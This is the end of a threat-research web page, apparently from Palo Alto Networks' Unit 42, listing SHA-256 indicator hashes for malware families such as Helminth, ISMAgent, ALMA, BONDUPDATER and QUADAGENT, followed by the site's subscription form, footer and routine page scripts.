<p>Helminth<br />
662c53e69b66d62a4822e666031fd441bbdfa741e20d4511c6741ec3cb02475f<br />
089bf971e8839db818ac462f53f82daed523c413bfc2e01fb76dd70b37162afe<br />
d808f3109822c185f1d8e1bf7ef7781c219dc56f5906478651748f0ace489d34<br />
1b2fee00d28782076178a63e669d2306c37ba0c417708d4dc1f751765c3f94e1<br />
0ec288ac8c4aa045a45526c2939dbd843391c9c75fa4a3bcc0a6d7dc692fdcd1<br />
3986d54b00647b507b2afd708b7a1ce4c37027fb77d67c6bc3c20c3ac1a88ca4<br />
f5a64de9087b138608ccf036b067d91a47302259269fb05b3349964ca4060e7e<br />
4b5112f0fb64825b879b01d686e8f4d43521252a3b4f4026c9d1d76d3f15b281</p>
<p>ISMAgent<br />
a9f1375da973b229eb649dc3c07484ae7513032b79665efe78c0e55a6e716821<br />
52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9</p>
<p>ALMA dash<br />
f37b1bbf5a07759f10e0298b861b354cee13f325bc76fbddfaacd1ea7505e111</p>
<p>ALMA dot<br />
e52b8b0e8225befec156b355b3022faf5617542b82aa54f9f42088aa05a4ec49</p>
<p>BONDUPDATER Original<br />
de620a0511d14a2fbc9b225ebfda550973d956ab4dec7e460a42e9d2d3cf0588</p>
<p>BONDUPDATER Updated<br />
d5c1822a36f2e7107d0d4c005c26978d00bcb34a587bd9ccf11ae7761ec73fb7<br />
7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00</p>
<p>QUADAGENT<br />
1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
